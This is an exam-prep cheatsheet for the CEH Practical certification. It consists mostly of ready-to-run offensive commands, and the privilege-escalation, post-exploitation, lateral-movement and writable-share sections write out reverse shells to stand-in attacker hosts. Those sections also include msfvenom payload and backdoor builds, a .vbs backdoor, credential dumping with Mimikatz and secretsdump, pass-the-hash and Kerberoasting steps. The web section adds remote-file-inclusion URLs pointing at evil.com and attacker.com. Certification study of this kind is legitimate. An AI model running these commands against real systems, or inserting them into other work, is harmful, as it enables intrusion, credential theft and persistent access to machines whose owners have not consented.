---

# 🛡️ **Comprehensive CEH Practical Exam Cheatsheet by Zeeshan**

---

### 1. **🕵️‍♂️ Information Gathering**

#### 🔍 **Nmap (Network Scanning & Enumeration)**
   - **Common Flags**:
     - **-sC**: Default script scanning.
     - **-sV**: Service version detection.
     - **-A**: Enable OS detection, version detection, script scanning, and traceroute.
     - **-p**: Specify ports (e.g., `-p 80,443` or `-p-` for all ports).
     - **-O**: OS detection.
     - **-sT**: Full TCP connect scan.
     - **-sP**: No Port Ping scan.
     - **-sS**: Stealth SYN scan.
     - **-sN**: Null scan (no flags set, useful for bypassing certain firewalls).
     - **-sn**: Skips port scanning, performing only host discovery.
     - **-Pn**: Disable host discovery.
     - **-vv**: Increase verbosity for detailed output.
     - **-oN**: Save output to a file in normal format.
     - **-T4**: Set timing template (T0 slow, T5 fast).

#### 🗂️ **Gobuster (Directory & File Brute-Forcing)**
   - **Basic Directory Fuzzing**:
     - `gobuster dir -u [URL] -w [WORDLIST]`
   - **File Extensions**:
     - `gobuster dir -u [URL] -w [WORDLIST] -x php,html`
   - **HTTPS Insecure**:
     - `gobuster dir -u https://[URL] -w [WORDLIST] -k`

#### 📜 **ffuf (Parameter & Fuzzing)**
   - **Basic Directory Fuzzing**:
     - `ffuf -w [WORDLIST] -u http://[TARGET]/FUZZ`
   - **Parameter Fuzzing**:
     - `ffuf -w [WORDLIST] -u http://[TARGET]?FUZZ=test`
   - **POST Data Fuzzing**:
     - `ffuf -w [WORDLIST] -X POST -d "username=FUZZ&password=test" -u http://[TARGET]/login`

#### 🌐 **Sublist3r (Subdomain Enumeration)**
   - **Basic Subdomain Enumeration**:
     - `sublist3r -d [DOMAIN]`
   - **Save Results to File**:
     - `sublist3r -d [DOMAIN] -o [OUTPUT_FILE]`
   - **Verbose Output**:
     - `sublist3r -v -d [DOMAIN]`

---

### 2. **🔓 Vulnerability Scanning & Exploitation**

#### 💻 **SQLMap (SQL Injection Automation)**
   - **Check Current Database User**:
     - `sqlmap -u [TARGET_URL] --current-user`
   - **Enumerate Databases**:
     - `sqlmap -u [TARGET_URL] --dbs`
   - **List Tables**:
     - `sqlmap -u [TARGET_URL] -D [DATABASE_NAME] --tables`
   - **Dump All Data from a Table**:
     - `sqlmap -u [TARGET_URL] -D [DATABASE_NAME] -T [TABLE_NAME] --dump`
   - **Execute OS Commands**:
     - `sqlmap -u [TARGET_URL] --os-shell`

#### 🔐 **Hydra (Brute Forcing)**
   - **SSH Brute Force**:
     - `hydra -l [USER] -P [WORDLIST] [TARGET_IP] ssh`
   - **HTTP POST Form Brute Force**:
     - `hydra -l [USER] -P [WORDLIST] [URL] http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid Login"`
     - **HTTP POST Form Brute Force Example**:
     ```bash
     hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.56.169 -V http-form-post "/login:username=^USER^&password=^PASS^:F=incorrect"
     ```
     - **HTTP GET Basic Auth Brute Force Example**:
     ```bash
     hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt http-get://enum.thm/labs/basic_auth/ -V
     ```
     - **FTP Brute Forcing**:
     - `hydra -l [USER] -P [WORDLIST] [TARGET_IP] ftp`

#### 🔍 **strace (System Call Tracer)**
   - **Trace system calls of a process**:
     - `strace -p [PID]`
   - **Trace execution of a binary**:
     - `strace [COMMAND]`
   - **Trace file access and file descriptors**:
     - `strace -e trace=open [COMMAND]`

#### 📚 **ltrace (Library Call Tracer)**
   - **Trace library calls made by a process**:
     - `ltrace -p [PID]`
   - **Trace a program's library calls**:
     - `ltrace [COMMAND]`
   - **Trace specific function calls**:
     - `ltrace -e [FUNCTION] [COMMAND]`

---

### 3. **🔨 WordPress Security Scanning**

#### 📝 **WPScan (WordPress Security Scanner)**
   - **Basic Scan**:
     - `wpscan --url [TARGET_URL]`
   
   - **Enumerate Users (`-e u`)**:
     - `wpscan --url [TARGET_URL] -e u`
   
   - **Enumerate Plugins (`-e p`)**:
     - `wpscan --url [TARGET_URL] -e p`
   
   - **Full Enumeration**:
     - `wpscan --url [TARGET_URL] -e vp,vt,u,m,t,cb,dbe`

   - **Brute Force Attack on WordPress Login**:
     - **General Syntax**:
       - `wpscan --url [TARGET_URL] -U [USER_LIST] -P [PASSWORD_LIST] --password-attack wp-login`
     - **Example**:
       ```bash
       wpscan --url blog.thm -U kwheel,bjoel -P /usr/share/wordlists/rockyou.txt --password-attack wp-login
       ```

   - **Brute Force via XML-RPC**:
     - `wpscan --url [TARGET_URL] --password-attack xmlrpc`
   
   - **Use WPScan API for Vulnerability Data**:
     - `wpscan --api-token [API_KEY] --url [TARGET_URL]`

---

### 4. **🔑 Password Cracking**

#### 🔐 **John the Ripper (Password Cracking)**
   - **Basic Wordlist Cracking**:
     - `john --wordlist=[WORDLIST] [HASH_FILE]`
   - **SHA-512 Crypt Format**:
     - `john --format=sha512crypt --wordlist=[WORDLIST] [HASH_FILE]`
   - **NTLM Format Cracking**:
     - `john --format=NT --wordlist=[WORDLIST] [HASH_FILE]`

#### 🔥 **Hashcat (Advanced Hash Cracking)**
   - **MD5 Hash Cracking**:
     - `hashcat -m 0 [HASH_FILE] [WORDLIST]`
   - **WPA2 Cracking**:
     - `hashcat -m 2500 [CAPTURE_FILE] [WORDLIST]`

---

### 5. **👑 Privilege Escalation**

#### 🐧 **Linux Privilege Escalation**

1. **Check If You Can Run Commands as Root**:
   - `sudo -l`
   
2. **Check if `/etc/passwd` or `/etc/shadow` Files Are Readable/Writable**:
   - `ls -l /etc/passwd /etc/shadow`
   
3. **Find SUID or SGID Bit Set Files**:
   - `find / -type f -perm -04000 -ls 2>/dev/null`
   
   📥 [LinPEAS](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh) - *Linux Privilege Escalation Script*

4. **Find Files with Capabilities**:
   - `getcap -r / 2>/dev/null`
   
   📥 [LinEnum](https://github.com/rebootuser/LinEnum) - *Linux Privilege Escalation Enumeration Script*

5. **Append Reverse Shell in Cronjobs**:
   - `cat /etc/crontab`
   - **Add Reverse Shell**:
     - `bash -i >& /dev/tcp/<your_ip>/<port> 0>&1`
   
6. **Path Exploitation**: Exploit misconfigured paths.

7. **NFS Exploitation**: Look for NFS share misconfigurations.

---

#### 💻 **Windows Privilege Escalation**

1. **Run Tools for Privilege Escalation**:
   - 📥 [WinPEAS](https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe) - *Windows Privilege Escalation Script*
   - 📥 [PrivescCheck](https://github.com/itm4n/PrivescCheck) - *Privilege Escalation Enumeration Tool*
   - 📥 [WES-NG](https://github.com/bitsadmin/wesng) - *Windows Exploit Suggester*

2. **Check Files

 for Credentials**:
   - `C:\Unattend.xml`
   - `C:\Windows\Panther\Unattend.xml`
   - `C:\Windows\system32\sysprep.inf`
   - `C:\Windows\system32\sysprep\sysprep.xml`

3. **Check PowerShell History**:
   - `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

4. **Check Saved Credentials**:
   - `cmdkey /list`
   - `runas /savecred /user:admin cmd.exe`

5. **Check IIS Configuration**:
   - `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`

6. **Retrieve PuTTY Credentials**:
   - `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`

7. **Check Scheduled Tasks for Misconfigurations**:
   - `schtasks /query /tn vulntask /fo list /v`
   - **Exploit Scheduled Task**:
     - `echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\tasktorun.bat`
     - `schtasks /run /tn vulntask`

8. **AlwaysInstallElevated Exploit**:
   - `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
   - **Generate Reverse Shell**:
     - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`
     - `msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

9. **Service Configuration Issues**:
   - `sc qc ______` (check service details)
   - Check **BINARY_PATH_NAME** and **SERVICE_START_NAME**

10. **Insecure Service Permissions**:
    - `sc qc WindowsScheduler`
    - **Replace Executable**:
      - `icacls C:\PROGRA~2\SYSTEM~1\WService.exe`
      - `wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe`
      - `move WService.exe WService.exe.bkp`
      - `move rev-svc.exe WService.exe`

11. **Unquoted Service Paths**: Identify and exploit unquoted service paths.

12. **Insecure Service Permissions**: Check and exploit incorrect service permissions.

13. **Abusing Dangerous Privileges**: Focus on **SeImpersonatePrivilege** and others.

14. **Common Exploitable Privileges**: Found at [Priv2Admin](https://github.com/gtworek/Priv2Admin).

---

### 6. **🔧 Post-Exploitation**

#### 📡 **Netcat (Networking Tool & Reverse Shells)**
   - **Listen for Connection**:
     - `nc -lvnp [PORT]`
   - **Reverse Shell**:
     - `nc [ATTACKER_IP] [PORT] -e /bin/bash`

#### 💻 **Mimikatz (Credential Dumping on Windows)**
   - **Dump Windows Credentials**:
     - `mimikatz.exe sekurlsa::logonpasswords`

#### 🔐 **SSH Key Persistence**:
   - **Add SSH Key**:
     - `echo [YOUR_PUBLIC_KEY] >> ~/.ssh/authorized_keys`

---

### 7. **🛠️ Lateral Movement**

Lateral movement techniques allow attackers to spread within the network once initial access is gained.

#### **🖥️ PsExec (SMB Lateral Movement)**

   - **Ports**: 445/TCP (SMB)
   - **Required Group Membership**: Administrators
   - **Description**: PsExec connects to the Admin$ share to upload a service binary (`psexesvc.exe`), then creates and runs the service to open a remote shell.

   - **Syntax**:
     ```bash
     psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
     ```

#### **🔧 WinRM (Remote Process Creation)**

   - **Ports**: 5985/TCP (WinRM HTTP), 5986/TCP (WinRM HTTPS)
   - **Required Group Membership**: Remote Management Users
   - **Description**: WinRM allows remote process creation over HTTP or HTTPS.

   - **Syntax**:
     ```bash
     winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
     ```

#### **🔑 Remote Service Creation via `sc`**

   - **Ports**:
     - 135/TCP, 445/TCP (RPC over SMB Named Pipes), 139/TCP
   - **Required Group Membership**: Administrators
   - **Description**: `sc` allows remote service creation, start, stop, and deletion.

   - **Example**:
     ```bash
     sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
     sc.exe \\TARGET start THMservice
     sc.exe \\TARGET stop THMservice
     sc.exe \\TARGET delete THMservice
     ```

#### **🕒 Creating Scheduled Tasks Remotely**

   - **Syntax**:
     ```bash
     schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
     schtasks /s TARGET /run /TN "THMtask1" 
     schtasks /S TARGET /TN "THMtask1" /DELETE /F
     ```

---

### 8. **🔒 NTLM Authentication Attacks**

#### **💻 Pass-the-Hash (PtH)**

   **Extract NTLM Hashes Using Mimikatz**:
   ```bash
   mimikatz # privilege::debug
   mimikatz # sekurlsa::msv
   ```
   - **Example of Using NTLM Hash with PsExec**:
     ```bash
     psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
     ```

   - **Connect via WinRM Using NTLM Hash**:
     ```bash
     evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
     ```

#### **🎫 Pass-the-Ticket (PtT)**

   - **Extract Ticket**:
     ```bash
     mimikatz # privilege::debug
     mimikatz # sekurlsa::tickets /export
     ```

   - **Inject Ticket**:
     ```bash
     mimikatz # kerberos::ptt [ticket_file]
     ```

#### **🔐 Overpass-the-Hash / Pass-the-Key**

   - **Example (Using RC4 Hash)**:
     ```bash
     mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:HASH /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
     ```

---

### 9. **📂 Abusing Writable Shares**

#### **📜 Backdooring `.vbs` Scripts**

   - **Inject a reverse shell into `.vbs` scripts**:
     ```bash
     CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
     ```

#### **🛠️ Backdooring `.exe` Files**

   - **Backdoor executable files using `msfvenom`**:
     ```bash
     msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
     ```

---

### 10. **🖥️ RDP Hijacking**

   - **Hijack RDP session**:
     ```bash
     PsExec64.exe -s cmd.exe
     query user
     tscon ID /dest:SESSIONNAME
     ```

---

### 11. **🌐 SSH Tunneling & Port Forwarding**

#### **🔀 SSH Remote Port Forwarding**

   - **Example**:
     ```bash
     ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
     xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
     ```

#### **🔀 SSH Local Port Forwarding**

   - **Example**:
     ```bash
     ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
     netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
     ```

---

### 12. **🔗 Port Forwarding with `socat`**

   - **Example**:
     ```bash
     socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321


     socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
     netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
     ```

---

### 13. **🧦 Dynamic Port Forwarding & SOCKS**

   - **Create a dynamic SSH tunnel and use it with proxychains**:
     ```bash
     ssh tunneluser@1.1.1.1 -R 9050 -N
     [ProxyList]
     socks4  127.0.0.1 9050
     proxychains curl http://pxeboot.za.tryhackme.com
     ```

---

### 14. **🛡️ Credentials Harvesting**

#### **🔍 PowerShell History**
   - **Location**:
     ```bash
     C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
     ```

#### **🔑 Registry Query for Stored Passwords**
   - **Search Registry for Passwords**:
     ```bash
     reg query HKLM /f password /t REG_SZ /s
     reg query HKCU /f password /t REG_SZ /s
     ```

#### **🔎 Dump Active Directory User Information**:
   ```bash
   Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
   ```

#### **📜 Extract SAM and SYSTEM Files**:
   - **Location**:
     ```bash
     c:\Windows\System32\config\sam
     ```

   - **Registry Hive Export**:
     ```bash
     reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
     python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
     ```

#### **🔓 Volume Shadow Copy for Credential Harvesting**:
   ```bash
   wmic shadowcopy call create Volume='C:\'
   vssadmin list shadows
   copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
   ```

#### **🛠️ LSASS Memory Dump for Credential Harvesting**:
   - **Mimikatz** can extract credentials from the LSASS process, but it requires debug privileges:
     ```bash
     mimikatz # privilege::debug
     mimikatz # sekurlsa::logonpasswords
     ```

#### **🔓 Dump Credentials from Vault (Credential Manager)**:
   ```bash
   vaultcmd /list
   VaultCmd /listproperties:"Web Credentials"
   VaultCmd /listcreds:"Web Credentials"
   ```

#### **🔐 Running Commands as Different Users**:
   - **RunAs with Saved Credentials**:
     ```bash
     cmdkey /list
     runas /savecred /user:THM.red\thm-local cmd.exe
     ```

#### **📂 Extracting NTDS (Active Directory) Database**:

   - **Local NTDS Dump**:
     ```bash
     C:\Windows\NTDS\ntds.dit
     C:\Windows\System32\config\SYSTEM
     powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
     python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
     ```

   - **Remote NTDS Dump**:
     ```bash
     python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@10.10.222.103
     ```

#### **🔍 Kerberoasting (SPN Extraction)**:
   - **Extract Service Principal Names (SPNs)**:
     ```bash
     python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.222.103 THM.red/thm
     python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.222.103 THM.red/thm -request-user svc-user
     ```

   - **Crack SPNs Using Hashcat**:
     ```bash
     hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
     ```

#### **🔓 AS-REP Roasting**:
   - **Extract AS-REP Tickets**:
     ```bash
     python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.222.103 thm.red/ -usersfile /tmp/users.txt
     ```

#### **📡 SMB Relay Attack**:
   - **LLMNR/NBNS Poisoning and Relay**:
     - Use **Responder** or **Impacket** tools to execute SMB Relay attacks.

---

### 15. **🖥️ Remote File Inclusion (RFI) & Local File Inclusion (LFI)**

#### **RFI (Remote File Inclusion)**

Remote File Inclusion allows attackers to include external files hosted on another server into the web application.

- **Basic RFI Example**:
  ```php
  http://example.com/index.php?page=http://evil.com/shell.txt
  ```
- **Exploiting RFI**:
  - Hosting a PHP reverse shell on your server and including it in the target:
  ```php
  http://target.com/index.php?page=http://attacker.com/shell.php
  ```

#### **LFI (Local File Inclusion)**

Local File Inclusion allows attackers to include files present on the web server itself.

- **Basic LFI Example**:
  ```php
  http://example.com/index.php?page=../../../../etc/passwd
  ```
- **Bypassing File Extension Filters**:
  - Null byte injection (`%00`) or double extensions can be used to bypass file extension filters.
  ```php
  http://example.com/index.php?page=../../../../etc/passwd%00
  ```

#### **RFI & LFI Prevention**:
- Input validation and output encoding.
- Use **realpath()** and **basename()** functions in PHP.

---

### 16. **🔨 DVWA Modules**

#### **DVWA (Damn Vulnerable Web Application)**

- **SQL Injection**:
  - **Example**: `admin'--`
  - **Automated Exploit**: Use `sqlmap -u [TARGET_URL] --dbs` to dump databases.
  
- **Cross-Site Scripting (XSS)**:
  - **Stored XSS Example**: `<script>alert('XSS');</script>`
  - **Reflected XSS Example**: Insert the script directly into URL parameters.
  
- **File Upload Vulnerabilities**:
  - **Exploit**: Upload a malicious PHP file, like a web shell (`shell.php`), and access it via the target's web directory.

- **Command Injection**:
  - **Example**: Use `; cat /etc/passwd` in a vulnerable form field to chain commands.

---

### 17. **🖥️ Weevely (Webshell Tool)**

Weevely is a stealthy PHP web shell used for remote command execution and backdoor access.

- **Weevely Basic Usage**:
  - **Generate Shell**:
    ```bash
    weevely generate password shell.php
    ```
  - **Deploy the shell to a web server** by uploading `shell.php` and then use Weevely to connect:
    ```bash
    weevely http://target.com/shell.php password
    ```
---

### 18.  **Snow (Steganography Tool)**

**Snow** is a whitespace steganography tool that hides messages in ASCII text files by appending spaces and tabs at the end of lines.

- **Basic Syntax**:
  ```bash
  snow -C -m "Your secret message" -p "password" input.txt output.txt
  ```
  - `-C`: Compress the message.
  - `-m`: Specifies the message to hide.
  - `-p`: Password for encryption.

- **Extracting Hidden Messages**:
  ```bash
  snow -C -p "password" output.txt
  ```
  This command retrieves the hidden message using the specified password.

**Key Use Cases**: 
- Hide sensitive information inside text files for secure communication.

---

### 19.  **VeraCrypt (Disk Encryption Tool)**

**VeraCrypt** is a disk encryption tool used for creating encrypted volumes and partitions, offering enhanced security for sensitive data.

- **Basic Usage**:
  1. **Creating an Encrypted Volume**:
     - Select **Create Volume** and choose **Create an encrypted file container**.
     - Choose encryption options like **AES** and **SHA-256** for the volume.
  2. **Mounting an Encrypted Volume**:
     - Use the GUI to select the encrypted volume and mount it by providing the password.

- **Command-Line Usage**:
  - **Mount Volume**:
    ```bash
    veracrypt --mount encrypted_volume.tc /mnt/secure
    ```
  - **Dismount Volume**:
    ```bash
    veracrypt -d /mnt/secure
    ```

**Key Use Cases**:
- Securely store sensitive files or entire partitions using encryption algorithms like **AES** and **Twofish**.

---

### 20.  **OpenStego (Steganography Tool)**

**OpenStego** is an open-source steganography tool that hides data inside images or other files.

- **Basic Usage**:
  1. **Embed Data**:
     ```bash
     openstego -embed -mf secret.txt -cf cover.png -sf stego.png
     ```
     - `-mf`: Specifies the message file.
     - `-cf`: Specifies the cover file (the image in which to hide the data).
     - `-sf`: Specifies the stego file (the output image with hidden data).

  2. **Extract Data**:
     ```bash
     openstego -extract -sf stego.png -mf extracted.txt
     ```

**Key Use Cases**:
- Hide sensitive text or files inside image files for covert communication.

---

### 21. **Cryptool (Cryptography Learning Tool)**

**Cryptool** is an educational tool that helps users understand cryptographic algorithms and techniques through visual representations and simulations.

- **Basic Cryptanalysis Example** (in GUI):
  1. **Open Cryptool** and select the cryptographic algorithm to explore, such as **RSA** or **AES**.
  2. **Perform Encryption**:
     - Enter a plaintext message and choose an encryption method.
  3. **Decrypt Encrypted Text** using the provided keys and analyze the encryption process.

**Key Use Cases**:
- Learn and visualize encryption algorithms like **RSA**, **AES**, and **DES**.
- Perform cryptographic analysis and brute-force decryption.

---

### 22. **DIE (Detect It Easy)**

**DIE** is a tool for detecting the type of binary files and analyzing their characteristics. It's useful in malware analysis and reverse engineering.

- **Basic Usage**:
  - Open a binary file in DIE, and it automatically detects the file type, architecture, and any packers or obfuscators used.

- **Key Features**:
  - File format identification (PE, ELF, Mach-O, etc.).
  - Detects compilers and packers used to build the binary.

**Key Use Cases**:
- Analyzing malware or obfuscated binaries to understand their structure.

---

### 23. **Aircrack-ng (Wireless Network Cracking)**

**Aircrack-ng** is a suite of tools for wireless network security, including tools for monitoring, attacking, testing, and cracking WiFi networks.

- **Capturing Packets (airodump-ng)**:
  - Start monitoring for nearby WiFi networks and capturing packets:
    ```bash
    airodump-ng wlan0mon
    ```
  - Target a specific network for packet capture:
    ```bash
    airodump-ng -c [channel] --bssid [BSSID] -w [output_file] wlan0mon
    ```

- **Cracking WPA2 Password (aircrack-ng)**:
  - Use captured packets to crack the WPA2 handshake:
    ```bash
    aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] [capture_file].cap
    ```

**Key Use Cases**:
- Capture network packets for cracking WPA2 and WEP encryption.
- Analyze and crack encrypted WiFi traffic using a dictionary attack.

---

### 24. **HashCalc (Hash Calculation Tool)**

**HashCalc** is a tool used to calculate various cryptographic hashes for files and text.

- **Basic Usage**:
  - Open **HashCalc** and input the file or text.
  - Select the desired hash function (e.g., **MD5**, **SHA-1**, **SHA-256**).
  - Generate the hash for the given input.

**Key Use Cases**:
- Verify file integrity by comparing hash values.
- Generate cryptographic hash values for files and messages.

---

### 25. **MD5 Calculator (MD5 Hash Calculation Tool)**

**MD5 Calculator** is a lightweight tool that calculates the **MD5** hash for a file or text input.

- **Basic Usage**:
  - Select a file, and the tool will compute the **MD5** hash value.

**Key Use Cases**:
- Check file integrity by comparing **MD5** hashes.

---

### 26. **TCPDump (Packet Capture Tool)**

**TCPDump** is a command-line packet analyzer that captures and displays network traffic passing through a system.

- **Basic Packet Capture**:
  - Capture all packets on an interface:
    ```bash
    tcpdump -i eth0
    ```
  - Capture packets to a file:
    ```bash
    tcpdump -i eth0 -w capture.pcap
    ```
  - Read a saved packet capture:
    ```bash
    tcpdump -r capture.pcap
    ```

- **Capture Specific Traffic**:
  - Capture HTTP traffic:
    ```bash
    tcpdump -i eth0 'tcp port 80'
    ```
  - Capture traffic to/from a specific IP:
    ```bash
    tcpdump -i eth0 host 192.168.1.1
    ```

**Key Use Cases**:
- Monitor and capture network traffic for analysis.
- Identify malicious activity or troubleshoot network issues.

---

### **27. Linux Incident Surface**

#### **Incident Response for Linux Systems**
When dealing with security incidents on Linux systems, the primary focus is on analyzing system logs, network traffic, running processes, services, and file integrity. The goal is to identify any anomalies or suspicious activities.

#### **System Logs**
- **`/var/log/auth.log`**: Logs authentication attempts, including successful and failed login attempts.
- **`/var/log/syslog`**: Captures general system activity and messages, including system errors and warnings.
- **`/var/log/kern.log`**: Logs kernel-level events, such as driver errors and system crashes.

#### **Network Traffic**
- Analyzing network traffic allows the detection of unusual outbound or inbound connections. Tools like **Wireshark**, **tcpdump**, and **netstat** are commonly used to monitor active connections.

#### **Running Processes**
- Regularly check running processes with commands like `ps aux` to ensure that no unauthorized or suspicious processes are running on the system.

#### **Running Services**
- Monitoring active services with commands like `systemctl` and `service` helps identify unauthorized services that could lead to a compromise.

#### **File & Process Integrity**
- Regular integrity checks can help detect modifications to system files or binaries. Tools like **AIDE** (Advanced Intrusion Detection Environment) and **Tripwire** are commonly used for integrity monitoring.

---

### **28. Linux Attack Surface**

#### **Common Vulnerabilities and Attack Vectors**
The **attack surface** of a Linux system comprises all potential points where an attacker could try to exploit a vulnerability. Regular audits and monitoring are essential to minimize risk.

#### **Open Ports**
- **Open ports** can expose services to the internet that may be vulnerable to attacks. Use `nmap` or `netstat -tuln` to list open ports on a system.

#### **Running Services**
- **Running services** can sometimes contain vulnerabilities, especially if they are outdated or misconfigured. Regularly audit running services using `systemctl` or `service --status-all`.

#### **Software Vulnerabilities**
- Any **running applications or software** with known vulnerabilities must be updated or patched. Use vulnerability scanning tools like **Nessus**, **OpenVAS**, or **Lynis** to identify potential weak spots.

#### **Network Communication**
- Monitoring **network communication** for unusual activity is crucial. Tools like **Wireshark** and **tcpdump** can help capture and analyze network traffic, revealing possible attacks or suspicious activity.

---

### **29. lsof -p PID (List Open Files by Process ID)**

The `lsof` (List Open Files) command shows files that are opened by a particular process. It helps track which files or network connections are being used by a specific PID (Process ID).

- **Basic Syntax**:
  ```bash
  lsof -p [PID]
  ```

- **Example**: 
  ```bash
  lsof -p 1234
  ```
  This command will display all files opened by the process with PID `1234`. It is useful for incident response to determine what resources a process is accessing, such as network connections or file reads/writes.

---


---


### **🔥 Some Important Past Paper Questions**

Here are some **repeated questions** often seen in the CEH Practical exam, compiled from multiple sources:

1. **Nmap Host Discovery**:
   - Command: `nmap -sn [TARGET_NETWORK]`
   - Host discovery without port scanning is a common task.
   
2. **Listing All Devices on a Network**:
   - Command: `netdiscover -i eth0`

3. **Hash Cracking**:
   - Use **John the Ripper** for cracking passwords: `john --wordlist=[WORDLIST] [HASH_FILE]`
   
4. **Android Hacking**:
   - **ADB** tool for Android hacking: `adb connect [IP]`
   - Related tools: **PhoneSploit** for exploiting Android platforms.

5. **Password Cracking**:
   - Tools like `john` and `hashcat` are often used in the exam. Make sure you’re familiar with **hash identification** using tools like `hashid` and cracking strategies for various hash types.

6. **Metasploit Exploitation**:
   - Use **Metasploit** for exploiting services like FTP or SMB after scanning with Nmap.

7. **Wireshark Filters**:
   - Packet analysis is frequently tested. Make sure to know filters such as `http`, `tcp.port==80`, and `ip.addr==192.168.1.1`.

8. **Brute Forcing Using Burp Suite**:
   - Learn how to capture a request, send it to **Intruder**, and launch a brute-force attack using wordlists.
   
9. **Find the IP of the Windows machine.**
   - Use `nmap -O [TARGET_NETWORK]` or `netdiscover -i eth0`

10. **What is the version of the Linux Kernel?**
   - Use `nmap -O [TARGET_IP]`

11. **How many Windows machines are there?**
   - Use `netdiscover -i eth0`

12. **What is the password for the user of the FTP server?**
   - Use `hydra` or `ftp` login attempts.

13. **What is the password hidden in the .jpeg file?**
   - Use steganography tools like **Steghide**, **OpenStego**, or **Snow**.

14. **Find the IP address of the machine running RDP?**
   - Use `nmap -p 3389 [TARGET_NETWORK]`

15. **Find the HTTP method that poses a high risk to the application example.com?**
   - Use `nmap --script http-methods -p 80 example.com`

16. **Find the phone number of the employee?**
   - Perform OSINT or check metadata in files using `exiftool`.

17. **Find the filename which is tampered by comparing the hashes given in the /hashes folder?**
   - Use `md5sum` or `sha1sum` to compare hashes.

18. **Decrypt the volume file using VeraCrypt?**
    - Use **VeraCrypt** to mount and decrypt the volume.

19. **Connect to the server remotely using the credentials given via RDP?**
    - Use `rdesktop` or `mstsc` command.

20. **Decode the file which is encoded in DES (ECB) format?**
    - Use cryptography tools like **OpenSSL**.

21. **Find the password of the WordPress user “Demo”?**
    - Use **WPScan** to enumerate users and brute-force passwords.

22. **Find the attacker's IP address who has launched the DoS attack?**
    - Analyze the provided PCAP file using **Wireshark**.

23. **Find the number of machines that were used to initiate the DDoS attack?**
    - Analyze network traffic in the PCAP file.

24. **Find the username/password from the pcap file, which is in plain text?**
    - Use **Wireshark** to extract credentials from unencrypted protocols.

25. **Extract the information from the SD card of the Android user?**
    - Use **ADB** or Android forensics tools.

26. **Find the OS name of the machine which is running MySQL database?**
    - Use `nmap -sV -p 3306 [TARGET_IP]`

27. **Find the Domain Controller’s name.**
    - Use `nmap --script smb-os-discovery.nse -p 445 [TARGET_IP]`

28. **Discover the IP of “wampserver”.**
    - Use `nmap -sV -p 80 [TARGET_NETWORK]`

29. **Crack “UserX’s” SMB credentials and decrypt “File.txt.”**
    - Use **Hydra** for SMB brute-force; decrypt file with obtained credentials.

30. **Determine the End of Life severity score on a specific host.**
    - Use vulnerability scanners like **Nessus**.

31. **Extract the data from “HiddenImage.jpg.”**
    - Use steganography tools.

32. **Exploit weak FTP credentials.**
    - Use **Hydra** or manual FTP login attempts.

33. **Gain root access using [exploit].**
    - Identify and use a local privilege escalation exploit.

34. **Find the entry point (address) in a given binary.**
    - Use reverse engineering tools like **Ghidra** or **OllyDbg**.

35. **Identify the attacker’s IP in “ddos.pcap” targeting a specific IP address.**
    - Analyze PCAP with **Wireshark**.

36. **Perform an SQL injection to extract data.**
    - Use **SqlMap** or manual SQL injection techniques.

37. **Identify IoT Publish Message length from traffic capture.**
    - Analyze MQTT traffic in **Wireshark**.

38. **Crack wireless encryption in “WirelessCapture.cap”.**
    - Use **Aircrack-ng** suite.

**Additional Resources**:
   - For hands-on practice, check out [TryHackMe Rooms](https://tryhackme.com) like:
     - **Further Nmap**: [Nmap TryHackMe](https://tryhackme.com/room/furthernmap)
